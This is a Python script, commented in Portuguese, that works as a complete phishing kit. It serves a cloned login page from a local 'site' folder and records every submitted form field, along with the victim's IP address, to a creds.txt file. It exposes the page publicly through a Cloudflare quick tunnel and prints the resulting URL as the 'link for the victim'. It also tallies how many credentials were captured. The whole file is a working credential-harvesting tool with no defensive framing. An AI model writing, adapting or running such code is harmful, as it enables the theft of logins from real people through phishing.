import os
import subprocess
import time
import threading
from pathlib import Path
from datetime import datetime
from http.server import HTTPServer, SimpleHTTPRequestHandler
import urllib.parse

# Configurações
PORT = 3333
SITE_DIR = Path.cwd() / "site"
LOGS_DIR = Path.cwd() / "logs"
CLOUDFLARED = Path.cwd() / "cloudflare.exe"

class CustomHandler(SimpleHTTPRequestHandler):
    """Handler que serve EXATAMENTE o site da pasta site e captura POSTs"""
    
    def do_POST(self):
        """Captura credenciais enviadas via POST"""
        content_length = int(self.headers.get('Content-Length', 0))
        
        if content_length > 0:
            post_data = self.rfile.read(content_length).decode('utf-8')
            params = urllib.parse.parse_qs(post_data)
            
            # Informações da vítima
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            ip = self.client_address[0]
            
            # Salva credenciais
            with open(LOGS_DIR / "creds.txt", "a", encoding="utf-8") as f:
                f.write(f"\n{'='*50}\n")
                f.write(f"[{timestamp}] IP: {ip}\n")
                for key, values in params.items():
                    if values and values[0]:
                        f.write(f"{key}: {values[0]}\n")
                f.write(f"{'='*50}\n")
            
            # Mostra no terminal
            print(f"\n\033[92m[+] CREDENCIAL CAPTURADA!\033[0m")
            print(f"  Hora: {timestamp}")
            print(f"  IP: {ip}")
            for key, values in params.items():
                if values and values[0]:
                    print(f"  {key}: {values[0]}")
            print()
        
        # Redireciona de volta para o index
        self.send_response(302)
        self.send_header('Location', '/')
        self.end_headers()
    
    def do_GET(self):
        """Serve EXATAMENTE os arquivos do seu site sem modificar nada"""
        # Simplesmente serve o arquivo solicitado da pasta site
        return SimpleHTTPRequestHandler.do_GET(self)

def start_server():
    """Inicia o servidor HTTP servindo a pasta site"""
    # Muda para a pasta do site
    os.chdir(SITE_DIR)
    
    # Cria o servidor com o handler customizado
    server = HTTPServer(("localhost", PORT), CustomHandler)
    print(f"[*] Servindo site da pasta: {SITE_DIR}")
    print(f"[*] Servidor rodando em http://localhost:{PORT}")
    server.serve_forever()

def start_tunnel():
    """Inicia o túnel Cloudflare"""
    print("[*] Iniciando Cloudflare Tunnel...")
    
    output_file = LOGS_DIR / "tunnel_output.txt"
    
    with open(output_file, "w") as f:
        subprocess.Popen(
            [str(CLOUDFLARED), "tunnel", "--url", f"localhost:{PORT}"],
            stdout=f,
            stderr=subprocess.STDOUT
        )
    
    # Aguarda e pega o link
    time.sleep(10)
    
    link = ""
    try:
        with open(output_file, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
            for word in content.split():
                if "https://" in word and "trycloudflare.com" in word:
                    link = word.strip()
                    break
    except:
        pass
    
    return link

def main():
    """Função principal"""
    # Limpa tela
    os.system("cls" if os.name == "nt" else "clear")
    
    # Banner roxo alinhado
    print("\033[95m" + """⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀       ⣀⣤⣴⣶⣶⣶⣿⣿⣿⣷⣶⣶⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀
⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⣿⣿⡏⠉⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠉⠉⣿⣿
⠀⠀⠀⠀⠀⠀⠀⢻⣿⡇⠀⠀⠀⠈⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⢀⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠘⣿⣷⡀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢿⣿⣿⣿⠿⠛⠋⠀⠀⠀⠀⠀⠀⢀⣼⣿⠃
⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣶⣦⣤⣀⣀⣀⣀⣀⣤⣶⠟⡿⣷⣦⣄⣀⣀⣀⣠⣤⣤⣶⣿⣿⡟⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⡇⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⣿⣿⡿⠿⠿⣿⣿⣷⠀⣼⣷⠀⣸⣿⣿⣿⡿⠿⠿⠿⣿⣿⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⡟⠋⠀⠀⠰⣿⣿⣿⣷⣿⣿⣷⣿⣿⣿⣿⡇⠀⠀⠀⣿⣿⠟⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠀⠈⠁⠀⠀⠘⣿⣿⢿⣿⣿⢻⣿⡏⣻⣿⣿⠃⠀⠀⠀⠈⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⣿⣿⡇⣿⣿⢸⣿⡇⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⣿⣿⡇⣿⣿⢸⣿⡇⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⢸⣿⡇⣿⣿⢸⣿⡇⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⣿⣿⢸⣿⠃⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠸⣿⡇⣿⣿⢸⣿⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠿⠇⢿⡿⢸⡿⠀⠿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    """ + "\033[0m")
    
    # Verifica se a pasta site existe
    if not SITE_DIR.exists():
        print(f"[!] ERRO: Pasta 'site' não encontrada!")
        print(f"[!] A pasta 'site' precisa existir com seu index.html")
        input("\nPressione Enter para sair...")
        return
    
    # Verifica se tem index.html
    index_path = SITE_DIR / "index.html"
    if not index_path.exists():
        print(f"[!] ERRO: index.html não encontrado!")
        print(f"[!] Coloque seu index.html em: {index_path}")
        input("\nPressione Enter para sair...")
        return
    
    print(f"[+] Site carregado: {index_path}")
    
    # Verifica cloudflared
    if not CLOUDFLARED.exists():
        print(f"\n[!] ERRO: cloudflared.exe não encontrado!")
        print(f"[!] Baixe de: https://github.com/cloudflare/cloudflared/releases")
        print(f"[!] Coloque o arquivo na mesma pasta do script")
        input("\nPressione Enter para sair...")
        return
    
    print(f"[+] Cloudflared encontrado")
    
    # Cria pasta de logs
    LOGS_DIR.mkdir(exist_ok=True)
    print(f"[+] Logs salvos em: {LOGS_DIR / 'creds.txt'}")
    
    # Inicia servidor em thread separada
    print("\n[*] Iniciando servidor web...")
    server_thread = threading.Thread(target=start_server, daemon=True)
    server_thread.start()
    time.sleep(2)
    
    # Inicia túnel Cloudflare
    link = start_tunnel()
    
    if not link:
        print("\n[!] ERRO: Falha ao criar túnel Cloudflare!")
        print("[!] Verifique sua conexão com internet")
        input("\nPressione Enter para sair...")
        return
    
    # Sucesso!
    print("\n" + "="*55)
    print(f"\033[92m[+] TÚNEL CLOUDFLARE ATIVO!\033[0m")
    print(f"\n[+] LINK PARA A VÍTIMA:")
    print(f"\033[93m{link}\033[0m")
    print(f"\n[+] O site sendo servido é: {index_path}")
    print(f"[+] Credenciais salvas em: {LOGS_DIR / 'creds.txt'}")
    print("="*55)
    print("\n\033[94m[*] Aguardando vítima acessar... (Ctrl+C para parar)\033[0m\n")
    
    # Mantém rodando
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\033[91m[!] Desligando...\033[0m")
        
        # Mostra estatísticas
        creds_file = LOGS_DIR / "creds.txt"
        if creds_file.exists():
            with open(creds_file, "r") as f:
                conteudo = f.read()
                total = conteudo.count("="*50)
            print(f"\n[+] Total de credenciais capturadas: {total}")
            print(f"[+] Verifique em: {creds_file}")
        else:
            print("[!] Nenhuma credencial capturada")
        
        print("\n[+] Programa finalizado!")

if __name__ == "__main__":
    main()